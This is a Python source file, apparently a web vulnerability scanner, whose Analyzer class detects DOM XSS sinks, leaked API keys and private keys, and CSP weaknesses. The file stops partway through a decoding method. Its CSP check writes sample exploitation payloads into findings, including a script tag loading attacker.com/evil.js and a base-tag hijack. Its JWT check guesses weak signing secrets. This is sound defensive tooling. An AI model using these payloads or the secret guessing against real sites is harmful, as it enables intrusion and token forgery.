import re
import urllib.parse
import base64
import json
import math
import time
try:
    import requests as _requests
except ImportError:
    _requests = None
from utils.component_checker import ComponentChecker
from utils.decryption.manager import DecryptionManager
from utils.ast_deobfuscator import ASTDeobfuscator

class Analyzer:
    def __init__(self, vuln_db=None):
        self.findings = []
        self.vuln_db = vuln_db
        self.component_checker = None
        self.vuln_db = vuln_db
        self.component_checker = None
        self.detected_waf = None
        if vuln_db:
            self.component_checker = ComponentChecker(vuln_db)
        
        self.decryption_manager = DecryptionManager()
        self.ast_deobfuscator = ASTDeobfuscator()
        
        self.patterns = {

            'DOM_XSS_INNERHTML': {
                'regex': r'\.innerHTML\s*=\s*[^"\'`][^;]*',
                'severity': 'HIGH',
                'description': 'Potential DOM XSS via innerHTML assignment.',
                'remediation': 'Use textContent instead of innerHTML, or sanitize the input using a library like DOMPurify.'
            },
            'DOM_XSS_OUTERHTML': {
                'regex': r'\.outerHTML\s*=\s*[^"\'`][^;]*',
                'severity': 'HIGH',
                'description': 'Potential DOM XSS via outerHTML assignment.',
                'remediation': 'Avoid using outerHTML with untrusted data.'
            },
            'DOM_XSS_DOC_WRITE': {
                'regex': r'document\.write(?:ln)?\s*\(\s*[^"\'`][^)]*\)',
                'severity': 'HIGH',
                'description': 'Potential DOM XSS via document.write().',
                'remediation': 'Avoid document.write() for dynamic content.'
            },
            'DOM_XSS_EVAL': {
                'regex': r'eval\s*\(\s*[^)]+\)',
                'severity': 'CRITICAL',
                'description': 'Potential DOM XSS or Code Injection via eval().',
                'remediation': 'Do not use eval() with untrusted data.'
            },
            'DOM_XSS_SETTIMEOUT': {
                'regex': r'setTimeout\s*\(\s*[^"\'`][^,]*\s*,',
                'severity': 'HIGH',
                'description': 'Potential DOM XSS via setTimeout() taking a string instead of a function.',
                'remediation': 'Pass a function reference to setTimeout, not a string.'
            },
            'DOM_XSS_SETINTERVAL': {
                'regex': r'setInterval\s*\(\s*[^"\'`][^,]*\s*,',
                'severity': 'HIGH',
                'description': 'Potential DOM XSS via setInterval() taking a string instead of a function.',
                'remediation': 'Pass a function reference to setInterval, not a string.'
            },
            'DOM_XSS_NEW_FUNCTION': {
                'regex': r'new\s+Function\s*\(\s*[^\)]+\)',
                'severity': 'CRITICAL',
                'description': 'Potential DOM XSS via new Function().',
                'remediation': 'Avoid dynamically creating functions with untrusted data.'
            },
            'OPEN_REDIRECT_LOCATION_HASH': {
                'regex': r'window\.location(?:\.href|\.replace|\.assign)?\s*=\s*.*location\.hash',
                'severity': 'HIGH',
                'description': 'Potential DOM-based Open Redirect reading from location.hash.',
                'remediation': 'Validate the URL before redirecting.'
            },
            'OPEN_REDIRECT_LOCATION_SEARCH': {
                'regex': r'window\.location(?:\.href|\.replace|\.assign)?\s*=\s*.*location\.search',
                'severity': 'HIGH',
                'description': 'Potential DOM-based Open Redirect reading from location.search.',
                'remediation': 'Validate the URL before redirecting.'
            },
            'POST_MESSAGE_NO_ORIGIN_CHECK': {
                'regex': r'window\.addEventListener\s*\(\s*[\'"]message[\'"]\s*,\s*(?:function|\([^)]*\)\s*=>)\s*\{(?![^}]+origin)',
                'severity': 'HIGH',
                'description': 'postMessage listener without explicit origin check detected.',
                'remediation': 'Always check event.origin against a strict allowlist before processing message data.'
            },
            'INSECURE_RANDOM_MATH_RANDOM': {
                'regex': r'Math\.random\(\)',
                'severity': 'LOW',
                'description': 'Insecure randomness via Math.random().',
                'remediation': 'Use window.crypto.getRandomValues() for security-critical randomness (e.g. tokens, keys).'
            },
            'LOCAL_STORAGE_SENSITIVE': {
                'regex': r'(?:localStorage|sessionStorage)\.setItem\s*\(\s*[\'"](?:password|secret|token|auth|key|session)[\'"]',
                'severity': 'MEDIUM',
                'description': 'Storing sensitive information in Web Storage.',
                'remediation': 'Store sensitive session data in HttpOnly, Secure cookies instead.'
            },
            'JSONP_CALLBACK_IN_URL': {
                'regex': r'\?(?:callback|cb|jsonp)=\w+',
                'severity': 'MEDIUM',
                'description': 'JSONP callback parameter found in URL string.',
                'remediation': 'Ensure the callback is strictly validated (alphanumeric only) and the response has application/javascript Content-Type and X-Content-Type-Options: nosniff.'
            },
            'CLIENT_SIDE_SQLI': {
                'regex': r'SELECT\s+.*?\s+FROM\s+.*?(?:WHERE\s+.*?=)?\s*[\'"]?\s*\+',
                'severity': 'CRITICAL',
                'description': 'Potential client-side SQL injection / raw query construction.',
                'remediation': 'Never construct SQL queries on the client or use unparameterized strings.'
            },
            'WEBSQL_INJECTION': {
                'regex': r'(?:executeSql|db\.transaction)\s*\(\s*[\'"](?:SELECT|INSERT|UPDATE|DELETE)[^,]+[\'"]\s*\+',
                'severity': 'HIGH',
                'description': 'Potential WebSQL / SQLite injection.',
                'remediation': 'Use parameterized queries (?) for local database operations.'
            },
            'COMMAND_INJECTION_NODE': {
                'regex': r'(?:child_process\.)?(?:exec|execSync|spawn|spawnSync)\s*\(\s*[^,)]*\+',
                'severity': 'CRITICAL',
                'description': 'Potential OS Command Injection (Node.js/Electron).',
                'remediation': 'Never concatenate user input into shell commands. Use spawn with an array of arguments, and avoid shell=true.'
            },
            'PATH_TRAVERSAL_NODE': {
                'regex': r'fs\.(?:readFile|readFileSync|createReadStream)\s*\(\s*[^,)]*\+',
                'severity': 'HIGH',
                'description': 'Potential Path Traversal / LFI (Node.js/Electron).',
                'remediation': 'Validate and sanitize file paths using path.basename() or against a strict directory allowlist.'
            },
            'XXE_DOMPARSER': {
                'regex': r'new\s+DOMParser\(\)\.parseFromString\(',
                'severity': 'MEDIUM',
                'description': 'XML Parsing detected. Verify if it is vulnerable to XXE (XML External Entity).',
                'remediation': 'Disable external entities in the XML parser configuration if server-side, or ensure input is sanitized.'
            },
            'INSECURE_DESERIALIZATION_EVAL': {
                'regex': r'JSON\.parse\s*\(\s*.*?\b(?:eval)\b',
                'severity': 'CRITICAL',
                'description': 'Insecure Deserialization using eval on parsed JSON.',
                'remediation': 'Never use eval() on deserialized data.'
            },
            'INSECURE_DESERIALIZATION_NODE': {
                'regex': r'node-serialize\.unserialize\s*\(|yaml\.load\s*\(',
                'severity': 'CRITICAL',
                'description': 'Insecure Deserialization detected (node-serialize or js-yaml).',
                'remediation': 'Use safe loading functions like yaml.safeLoad() or standard JSON.parse().'
            },
            'HARDCODED_INTERNAL_IP': {
                'regex': r'[\'"](?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3})[\'"]',
                'severity': 'LOW',
                'description': 'Hardcoded Internal IP address detected.',
                'remediation': 'Internal IP exposure may help attackers map the internal network. Use environment variables.'
            },
            'HARDCODED_PASSWORD': {
                'regex': r'(?i)(?:password|passwd|pwd)\s*[:=]\s*[\'"][^\'"]+[\'"]',
                'severity': 'HIGH',
                'description': 'Potential hardcoded password.',
                'remediation': 'Store passwords securely using environment variables or a secrets manager.'
            },
            'GRAPHQL_INTROSPECTION': {
                'regex': r'__schema\s*\{\s*types|__type\s*\(',
                'severity': 'MEDIUM',
                'description': 'GraphQL Introspection query detected.',
                'remediation': 'Ensure introspection is disabled in production to prevent schema leakage.'
            },
            'AWS_ACCESS_KEY': {
                'regex': r'(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
                'severity': 'HIGH',
                'description': 'AWS Access Key ID detected.',
                'remediation': 'Revoke the key and use IAM roles.'
            },
            'AWS_SECRET_KEY': {
                'regex': r'(?i)aws_(?:secret_)?(?:access_)?key(?:_id)?(?:["\']\s*[:=]\s*["\']|[:=]\s*["\']?)([0-9a-zA-Z/+]{40})(?:["\']?)',
                'severity': 'CRITICAL',
                'description': 'AWS Secret Access Key detected.',
                'remediation': 'Rotate this key immediately and store secrets securely.'
            },
            'RSA_PRIVATE_KEY': {
                'regex': r'-----BEGIN RSA PRIVATE KEY-----',
                'severity': 'CRITICAL',
                'description': 'RSA Private Key detected.',
                'remediation': 'Rotate keys immediately and store secrets securely.'
            },
            'SSH_DSA_PRIVATE_KEY': {
                'regex': r'-----BEGIN DSA PRIVATE KEY-----',
                'severity': 'CRITICAL',
                'description': 'SSH DSA Private Key detected.',
                'remediation': 'Rotate keys immediately and store secrets securely.'
            },
            'SSH_EC_PRIVATE_KEY': {
                'regex': r'-----BEGIN EC PRIVATE KEY-----',
                'severity': 'CRITICAL',
                'description': 'SSH EC Private Key detected.',
                'remediation': 'Rotate keys immediately and store secrets securely.'
            },
            'PGP_PRIVATE_BLOCK': {
                'regex': r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
                'severity': 'CRITICAL',
                'description': 'PGP Private Key Block detected.',
                'remediation': 'Rotate keys immediately and store secrets securely.'
            },
            'JSON_WEB_TOKEN': {
                'regex': r'ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
                'severity': 'HIGH',
                'description': 'Potential JWT Token detected.',
                'remediation': 'Ensure tokens are not hardcoded or leaked.'
            },
            'MAILGUN_API_KEY': {
                'regex': r'key-[0-9a-zA-Z]{32}',
                'severity': 'HIGH',
                'description': 'Mailgun API Key detected.',
                'remediation': 'Revoke the key and use environment variables.'
            },
            'TWILIO_API_KEY': {
                'regex': r'SK[0-9a-fA-F]{32}',
                'severity': 'HIGH',
                'description': 'Twilio API Key detected.',
                'remediation': 'Revoke the key and use environment variables.'
            },
            'SQUARE_ACCESS_TOKEN': {
                'regex': r'sq0atp-[0-9A-Za-z\-_]{22}',
                'severity': 'HIGH',
                'description': 'Square Access Token detected.',
                'remediation': 'Revoke the token and use environment variables.'
            },
            'SQUARE_OAUTH_SECRET': {
                'regex': r'sq0csp-[0-9A-Za-z\-_]{43}',
                'severity': 'HIGH',
                'description': 'Square OAuth Secret detected.',
                'remediation': 'Revoke the secret and use environment variables.'
            },
            'PAYPAL_BRAINTREE_ACCESS_TOKEN': {
                'regex': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
                'severity': 'HIGH',
                'description': 'PayPal Braintree Access Token detected.',
                'remediation': 'Revoke the token and use environment variables.'
            },
            'PICQER_API_KEY': {
                'regex': r'piq_[0-9a-zA-Z]{5,}',
                'severity': 'HIGH',
                'description': 'Picqer API Key detected.',
                'remediation': 'Revoke the key and use environment variables.'
            },
            'SHOPIFY_ACCESS_TOKEN': {
                'regex': r'shpat_[0-9a-fA-F]{32}',
                'severity': 'HIGH',
                'description': 'Shopify Access Token detected.',
                'remediation': 'Revoke the token and use environment variables.'
            },
            'SLACK_WEBHOOK': {
                'regex': r'https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}',
                'severity': 'HIGH',
                'description': 'Slack Webhook detected.',
                'remediation': 'Revoke the webhook and use environment variables.'
            },
            'HEROKU_API_KEY': {
                'regex': r'[hH]eroku.{0,30}[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
                'severity': 'HIGH',
                'description': 'Heroku API Key detected.',
                'remediation': 'Revoke the key and use environment variables.'
            },
            'FACEBOOK_ACCESS_TOKEN': {
                'regex': r'EAACEdEose0cBA[0-9A-Za-z]+',
                'severity': 'HIGH',
                'description': 'Facebook Access Token detected.',
                'remediation': 'Revoke the token and use environment variables.'
            },
            'TWITTER_CLIENT_ID': {
                'regex': r'(?i)twitter(.{0,20})?[\'"][0-9a-zA-Z]{18,25}["\']',
                'severity': 'MEDIUM',
                'description': 'Twitter Client ID detected.',
                'remediation': 'Verify if this ID is intended to be public.'
            },
            'TWITTER_SECRET_KEY': {
                'regex': r'(?i)twitter(.{0,20})?[\'"][0-9a-zA-Z]{35,44}["\']',
                'severity': 'HIGH',
                'description': 'Twitter Secret Key detected.',
                'remediation': 'Revoke the key and use environment variables.'
            },

            'API_KEY_AWS': {
                'pattern': r'(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])', # Simplified, usually AKIA...
                'regex': r'AKIA[0-9A-Z]{16}',
                'severity': 'HIGH',
                'description': 'AWS Access Key ID detected.',
                'remediation': 'Revoke the key and use IAM roles.'
            },
            'API_KEY_GOOGLE': {
                'regex': r'AIza[0-9A-Za-z-_]{35}',
                'severity': 'HIGH',
                'description': 'Google API Key detected.',
                'remediation': 'Restrict the key or use backend proxy.'
            },
            'PRIVATE_KEY': {
                'regex': r'-----BEGIN PRIVATE KEY-----',
                'severity': 'CRITICAL',
                'description': 'Private Key detected.',
                'remediation': 'Rotate keys immediately and store secrets securely.'
            },
            'USER_REQUESTED_KEY': {
                'regex': r'\$785%\$#\*\*5#@!7\^#',
                'severity': 'HIGH',
                'description': 'Custom Pattern Symbols detected.',
                'remediation': 'Investigate this custom secret format.'
            },
            'CUSTOM_HARDCODED_SECRETS': {
                'regex': r'([37]x!A%[DS]\*[IG]-[\w@#$%^&*!]{6,8})|(&a!@0\(l%\+0YU\*\^4g)|(LD@8RG#3SEZ)|(3337373832353434326134373264346236313530363435333637353632343430)',
                'severity': 'CRITICAL',
                'description': 'Known custom hardcoded secret detected.',
                'remediation': 'These patterns match known secret keys. Rotate immediately.'
            },
            'AES_OBFUSCATION_LOOP': {
                'regex': r'while\s*\(\s*!!\[\]\s*\)\s*\{.*?push.*shift',
                'severity': 'HIGH',
                'description': 'Obfuscated array rotation loop detected (common in malware/packers).',
                'remediation': 'Deobfuscate and analyze the code logic.'
            },
            'HARDCODED_KEK': {
                'regex': r'UlVGbk1tbHVkR0kyYm5wUFZYVXlTMEk9',
                'severity': 'HIGH',
                'description': 'Hardcoded Key Encryption Key (KEK) detected.',
                'remediation': 'Do not hardcode keys in client-side code.'
            },
            'AES_AUTO_INCREMENT': {
                'regex': r'encryptedAutoIncrement',
                'severity': 'MEDIUM',
                'description': 'Suspicious encrypted variable name detected.',
                'remediation': 'Verify the purpose of this encrypted data.'
            },
            'JWT_TOKEN': {
                'regex': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
                'severity': 'HIGH',
                'description': 'Potential JWT Token detected.',
                'remediation': 'Ensure tokens are not hardcoded or leaked.'
            },
            'SLACK_TOKEN': {
                'regex': r'xox[baprs]-([0-9a-zA-Z]{10,48})',
                'severity': 'HIGH',
                'description': 'Slack Token detected.',
                'remediation': 'Revoke token and use environment variables.'
            },
            'GOOGLE_OAUTH_ID': {
                'regex': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
                'severity': 'LOW',
                'description': 'Google OAuth Client ID detected.',
                'remediation': 'Verify if this ID is intended to be public.'
            },
            'SENSITIVE_PUBLIC_API': {
                'regex': r'["\'][\w\-./:]*(api/Public|PublicApi|/api/Public)[\w\-./?&=%]*["\']',
                'severity': 'HIGH',
                'description': 'Potential sensitive public API endpoint or variable detected.',
                'remediation': 'Verify if this endpoint or variable name exposes internal API structures.'
            },
            'SENSITIVE_CONSTRUCTED_PATH': {
                'regex': r'\b\w*URL\b\s*\+\s*["\']/?api/[\w/]+["\']',
                'severity': 'MEDIUM',
                'description': 'URL path being constructed dynamically with /api/.',
                'remediation': 'Review dynamic URL construction for potential exposure.'
            },
            'HARDCODED_ENCRYPT_KEY': {
                'regex': r'\b(encryptkey|secret|token|auth_key|api_key|access_key|private_key|secret_key)\b\s*[:=]\s*["\'][\w-]{5,}["\']',
                'severity': 'HIGH',
                'confidence': '90%',
                'description': 'Potential hardcoded secret key.',
                'remediation': 'Store secrets in environment variables.'
            },
            'CRYPTOJS_AES_ENCRYPT': {
                'regex': r'CryptoJS\.AES\.encrypt\([^,]+,\s*["\']([^"\']+)["\']',
                'severity': 'CRITICAL',
                'confidence': '99%',
                'description': 'Hardcoded AES Key in CryptoJS detected.',
                'remediation': 'Do not hardcode keys in client-side code.'
            },
            'NUMERIC_PARTS_KEY_GEN': {
                'regex': r'numericParts\s*=\s*\[(\d+,\s*)+\d+\]',
                'severity': 'CRITICAL',
                'confidence': '95%',
                'description': 'Dynamic key generation via numericParts array detected.',
                'remediation': 'Do not use predictable client-side key generation.'
            },
            'HARDCODED_KEY_VAR': {
                'regex': r'\b(aesValu|aesiv|juKu)\b\s*=',
                'severity': 'HIGH',
                'confidence': '80%',
                'description': 'Potential hardcoded/dynamic key variable assignment.',
                'remediation': 'Verify the source of this key variable.'
            },
            'BASE64_POTENTIAL_KEY': {
                'regex': r'["\'](N3[A-Za-z0-9+/]{20,60}={0,2})["\']',
                'severity': 'HIGH',
                'confidence': '85%',
                'description': 'Suspicious Base64 string (potential encoded key starting with 7x...).',
                'remediation': 'Decode and verify if this is a hardcoded secret.'
            },
            'STRIPE_API_KEY': {
                'regex': r'(?i)stripe(.{0,20})?["\']?(sk_live_[0-9a-zA-Z]{24})',
                'severity': 'CRITICAL',
                'confidence': '99%',
                'description': 'Stripe Live Secret Key detected.',
                'remediation': 'Revoke the Stripe key immediately and rotate.'
            },
            'GITHUB_PAT_TOKEN': {
                'regex': r'ghp_[0-9a-zA-Z]{36}',
                'severity': 'CRITICAL',
                'confidence': '99%',
                'description': 'GitHub Personal Access Token detected.',
                'remediation': 'Revoke token in GitHub Developer Settings.'
            },
            'SSRF_URL_PARAM': {
                'regex': r'[\?&](url|uri|target|dest|destination|proxy|redirect|webhook)=http[s]?://',
                'severity': 'MEDIUM',
                'confidence': '60%',
                'description': 'Potential SSRF or Open Redirect parameter in URL.',
                'remediation': 'Validate all URLs passed as parameters on the backend.'
            },
            'S3_BUCKET_EXPOSURE': {
                'regex': r'[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com|[a-zA-Z0-9-\.\_]+\.s3-[a-z0-9-]+\.amazonaws\.com',
                'severity': 'INFO',
                'confidence': '90%',
                'description': 'AWS S3 Bucket URL detected.',
                'remediation': 'Verify the S3 bucket permissions do not allow public write/read if sensitive.'
            },
            'AUTHORIZATION_BEARER': {
                'regex': r'["\']?Authorization["\']?\s*:\s*["\']?Bearer\s+([A-Za-z0-9-._~+/]+=*)["\']?',
                'severity': 'HIGH',
                'confidence': '95%',
                'description': 'Hardcoded Bearer Token in authorization header.',
                'remediation': 'Never hardcode active session or API bearer tokens in client-side code.'
            },
            'FIREBASE_DATABASE_URL': {
                'regex': r'https://[a-z0-9-]+\.firebaseio\.com',
                'severity': 'MEDIUM',
                'confidence': '90%',
                'description': 'Firebase Realtime Database URL detected.',
                'remediation': 'Ensure Firebase Security Rules are properly configured.'
            }
        }

    def _shannon_entropy(self, data):
        if not data:
            return 0
        entropy = 0
        for x in set(data):
            p_x = float(data.count(x)) / len(data)
            entropy += - p_x * math.log(p_x, 2)
        return entropy

    def _check_csp(self, url, headers, source):
        if not headers: return
        csp_header = None
        for k, v in headers.items():
            if k.lower() == 'content-security-policy':
                csp_header = v
                break
        if not csp_header:
            f = {
                'url': url, 'type': 'MISSING_CSP', 'severity': 'LOW',
                'description': 'Content-Security-Policy header is missing entirely.',
                'remediation': 'Implement a strict CSP to mitigate XSS and data injection attacks.',
                'match': 'No CSP Header', 'context': 'Response Headers', 'line': 0, 'source': source
            }
            if f not in self.findings: self.findings.append(f)
            return
            
        csp = csp_header.lower()
        misconfigs = []
        payloads = []
        
        # Parse directives into a dictionary for precise checking
        directives = {}
        for directive in csp.split(';'):
            directive = directive.strip()
            if not directive: continue
            parts = directive.split()
            directives[parts[0]] = parts[1:] if len(parts) > 1 else []

        script_src = directives.get('script-src', directives.get('default-src', []))
        object_src = directives.get('object-src', directives.get('default-src', []))
        base_uri = directives.get('base-uri', [])
        frame_ancestors = directives.get('frame-ancestors', [])

        # 1. Unsafe Inline
        if "'unsafe-inline'" in script_src:
            misconfigs.append("Allows inline scripts ('unsafe-inline' in script-src).")
            payloads.append("Basic XSS: \"><script>alert(1)</script>")
            payloads.append("Event Handler: \" autofocus onfocus=alert(1)")

        # 2. Unsafe Eval
        if "'unsafe-eval'" in script_src:
            misconfigs.append("Allows string-to-code execution ('unsafe-eval' in script-src).")
            payloads.append("Eval Execution: eval('alert(1)')")
            payloads.append("SetTimeout Execution: setTimeout('alert(1)', 500)")

        # 3. Wildcards & Broad Origins
        if '*' in script_src or 'https://*' in script_src or 'http://*' in script_src:
            misconfigs.append("Wildcard origin in script-src allows loading scripts from anywhere.")
            payloads.append("External Script: \"><script src=\"https://attacker.com/evil.js\"></script>")

        # 4. Insecure Schemes
        if any(scheme in script_src for scheme in ['data:', 'http:', 'https:']):
            misconfigs.append("Insecure URI scheme in script-src (data:, http:, or https:).")
            payloads.append("Data URI Execution: \"><script src=\"data:text/javascript,alert(1)\"></script>")

        # 5. Missing object-src
        if not object_src or ('*' in object_src and "'none'" not in object_src):
            misconfigs.append("Missing or permissive object-src (allows Flash/PDF/Applet injection).")
            payloads.append("Plugin Injection: <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>")

        # 6. Missing base-uri
        if not base_uri or '*' in base_uri:
            misconfigs.append("Missing or permissive base-uri (allows base tag injection to hijack relative URLs).")
            payloads.append("Base Hijack: \"><base href=\"https://attacker.com\">")

        # 7. Known Bypassable CDNs (JSONP endpoints)
        vulnerable_cdns = ['ajax.googleapis.com', 'cdnjs.cloudflare.com', 'unpkg.com', 'jsdelivr.net', 'code.jquery.com']
        found_cdns = [cdn for cdn in vulnerable_cdns if any(cdn in src for src in script_src)]
        if found_cdns:
            misconfigs.append(f"Allows loading scripts from CDNs known to host JSONP endpoints or outdated Angular libraries: {', '.join(found_cdns)}")
            payloads.append("JSONP Bypass (Example): \"><script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js\"></script><div ng-app>{{$eval.constructor('alert(1)')()}}</div>")

        # 8. Strict-Dynamic without backward compatibility
        if "'strict-dynamic'" in script_src and not any("nonce-" in src for src in script_src) and not any("sha256-" in src for src in script_src):
            misconfigs.append("'strict-dynamic' used without a nonce or hash, which may break security or fail open.")

        # 9. Clickjacking Protection (frame-ancestors)
        if not frame_ancestors:
            misconfigs.append("Missing frame-ancestors directive (vulnerable to Clickjacking if X-Frame-Options is also missing).")
            payloads.append("Clickjacking PoC: <iframe src=\"{url}\"></iframe>")

        if misconfigs:
            severity = 'HIGH' if ("'unsafe-inline'" in script_src or '*' in script_src) else 'MEDIUM'
            f = {
                'url': url,
                'type': 'CSP_MISCONFIGURATION_ADVANCED',
                'severity': severity,
                'description': 'Advanced CSP Analysis detected weaknesses:\\n- ' + '\\n- '.join(misconfigs) + '\\n\\nExploitation Payloads & Techniques:\\n- ' + '\\n- '.join(payloads),
                'remediation': "Implement a strict, nonce-based CSP. Restrict script-src, set object-src 'none', set base-uri 'none', and use frame-ancestors to prevent clickjacking.",
                'match': csp_header,
                'context': 'Content-Security-Policy Analysis',
                'line': 0,
                'source': source
            }
            if f not in self.findings:
                self.findings.append(f)

    def scan(self, response_data, network_urls=None, headers=None):
        """
        Main analysis method.
        Analyzes the given response dictionary ({url: body_content}) for vulnerabilities.
        Returns a list of finding dictionaries.
        """
        new_findings = []
        network_urls = network_urls or set()
        
        for url, content in response_data.items():
            print(f"[*] Scanning {url}...")
            source = 'NETWORK' if url in network_urls else 'STATIC'
            
            # 0. Check Content Security Policy (CSP)
            self._check_csp(url, headers, source)
            
            # 1. Check for reflected inputs from the URL itself
            self._check_reflection(url, content, source)
            
            # 2. Check for IDOR candidates in URL parameters
            self._check_idor(url, source)

            # 2.5 Check for sensitive parameters (Open Redirect, SSRF, LFI)
            self._check_sensitive_params(url, source)
            
            # 2.6 Extract API Parameter maps
            self._extract_api_map(url, content, source)
            
            # 2.7 Static Taint Analysis for DOM XSS
            self._check_dom_xss_taint(url, content, source)

            # 2.8 Decode Base64/Hex and find sensitive URLs
            self._decode_and_find_sensitive(url, content, source)

            # 3. Check for known vulnerabilities in components
            if self.component_checker:
                comp_findings = self.component_checker.check(url, content, headers=headers)
                for f in comp_findings:
                    f['source'] = source
                    if f not in self.findings:
                        self.findings.append(f)
                        new_findings.append(f)

            # 3. Dynamic Decryption & Deobfuscation (Catch packed payloads)
            decryption_findings = self.decryption_manager.run(content, url)
            if decryption_findings:
                for f in decryption_findings:
                    finding = {
                        'url': url,
                        'type': 'DECRYPTED_PAYLOAD',
                        'severity': 'HIGH',
                        'description': 'Advanced Deobfuscation/Decryption Successful',
                        'remediation': 'Review exposed logic.',
                        'match': f,
                        'context': 'Dynamically decrypted payload',
                        'line': 0,
                        'source': source
                    }
                    if finding not in self.findings:
                        self.findings.append(finding)
                        new_findings.append(finding)

            # 3.5 AST Deobfuscation
            deobfuscated_code = self.ast_deobfuscator.deobfuscate(content)
            if deobfuscated_code:
                contents_to_scan = [(content, source), (deobfuscated_code, f"{source} (AST Deobfuscated)")]
            else:
                contents_to_scan = [(content, source)]

            # 4. Check each pattern against content
            for scan_content, scan_source in contents_to_scan:
                for name, data in self.patterns.items():
                    pattern = data['regex']
                    matches = re.finditer(pattern, scan_content)
                    for match in matches:
                        match_str = match.group(0)
                        
                        # Apply Advanced Entropy Validation for generic keys
                        if name in ['API_KEY_AWS', 'GENERIC_KEY_ASSIGNMENT', 'BASE64_POTENTIAL_KEY', 'HARDCODED_ENCRYPT_KEY', 'HARDCODED_KEY_VAR', 'SUSPICIOUS_FUNC_ARG_KEY']:
                            # Extract just the value part if it's an assignment (e.g., key="VALUE")
                            val_match = re.search(r'["\']([^"\']+)["\']', match_str)
                            check_val = val_match.group(1) if val_match else match_str
                            
                            # Filter out low entropy strings (e.g., "0000000000", "aaaaabbbbb")
                            if len(check_val) > 10 and self._shannon_entropy(check_val) < 3.5:
                                continue
                                
                        # JWT Offline Analysis
                        jwt_details = ""
                        if name == 'JWT_TOKEN':
                            try:
                                import hmac
                                import hashlib
                                parts = match_str.split('.')
                                if len(parts) == 3:
                                    # Fix padding
                                    header_b64 = parts[0] + '=' * (-len(parts[0]) % 4)
                                    payload_b64 = parts[1] + '=' * (-len(parts[1]) % 4)
                                    
                                    header = json.loads(base64.urlsafe_b64decode(header_b64).decode())
                                    payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
                                    
                                    alg = header.get('alg', '').upper()
                                    jwt_details = f"\n[+] Extracted Payload: {json.dumps(payload)[:100]}...\n[+] Algorithm: {alg}\n"
                                    
                                    if alg.lower() == 'none':
                                        jwt_details += "[!] CRITICAL: JWT accepts 'none' signing algorithm!"
                                        data['severity'] = 'CRITICAL'
                                        data['confidence'] = '99%'
                                    elif alg == 'HS256':
                                        # Brute-force common weak secrets
                                        common_secrets = ['secret', '123456', 'password', 'admin', 'key', 'test']
                                        msg = f"{parts[0]}.{parts[1]}".encode('utf-8')
                                        signature = base64.urlsafe_b64decode(parts[2] + '=' * (-len(parts[2]) % 4))
                                        
                                        cracked_secret = None
                                        for secret in common_secrets:
                                            expected_mac = hmac.new(secret.encode('utf-8'), msg, hashlib.sha256).digest()
                                            if hmac.compare_digest(expected_mac, signature):
                                                cracked_secret = secret
                                                break
                                                
                                        if cracked_secret:
                                            jwt_details += f"[!!!] CRITICAL: JWT signed with extremely weak/default secret: '{cracked_secret}'"
                                            data['severity'] = 'CRITICAL'
                                            data['confidence'] = '100%'
                                            data['description'] = "JWT Token uses a highly vulnerable default secret. Token forgery is possible."
                                            
                                    # Check for weak HMAC algorithms (HS128, etc) or missing exp/iat
                                    if 'exp' not in payload:
                                        jwt_details += "[-] Note: Token does not have an 'exp' (expiration) claim."
                            except Exception:
                                pass

                        snippet = scan_content[max(0, match.start() - 50):min(len(scan_content), match.end() + 50)]
                        
                        # Add compliance mapping based on the vulnerability type
                        compliance = "N/A"
                        if name in ['HARDCODED_ENCRYPT_KEY', 'GENERIC_KEY_ASSIGNMENT', 'CRYPTOJS_AES_ENCRYPT', 'BASE64_POTENTIAL_KEY', 'HARDCODED_KEY_VAR', 'SUSPICIOUS_FUNC_ARG_KEY']:
                            compliance = "OWASP A02:2021-Cryptographic Failures, PCI-DSS Req 3.5/3.6"
                        elif name in ['STRIPE_API_KEY', 'GITHUB_PAT_TOKEN', 'AUTHORIZATION_BEARER']:
                            compliance = "OWASP A07:2021-Identification and Authentication Failures, NIST SP 800-63B"
                        elif name in ['SSRF_URL_PARAM']:
                            compliance = "OWASP A10:2021-Server-Side Request Forgery (SSRF)"
                        elif name in ['SENSITIVE_API_PATH', 'SENSITIVE_FILE_EXPOSURE', 'S3_BUCKET_EXPOSURE', 'FIREBASE_DATABASE_URL']:
                            compliance = "OWASP A01:2021-Broken Access Control, ISO 27001 A.14.1.2"

                        finding = {
                            'url': url,
                            'type': name,
                            'severity': data['severity'],
                            'confidence': data.get('confidence', 'N/A'),
                            'compliance': compliance,
                            'description': data['description'] + jwt_details,
                            'remediation': data['remediation'],
                            'match': match_str,
                            'context': snippet.strip(),
                            'line': scan_content[:match.start()].count('\n') + 1,
                            'source': scan_source
                        }
                        
                        # Only add if it's uniquely new to prevent exponential bloat
                        if finding not in self.findings:
                            self.findings.append(finding)
                            new_findings.append(finding)
        
        return new_findings

    def _decode_and_find_sensitive(self, url, content, source='STATIC'):
        """
        Decodes Base64, Hex, URL-encoded, and Hex-escaped strings found in the content.
        Checks if they contain sensitive paths like '/api/Public'.
        """
        import base64
        import binascii
        import urllib.parse
        
        # 1. Patterns for obfuscated strings
        # - Strings in quotes (Base64, Hex, URL-encoded)
        # - atob('...'), unescape('...'), etc.
        # - Hex escape sequences: \x61\x70\x69
        # - fromCharCode(97, 112, 105)
        
        # Combined regex for potential encoded strings
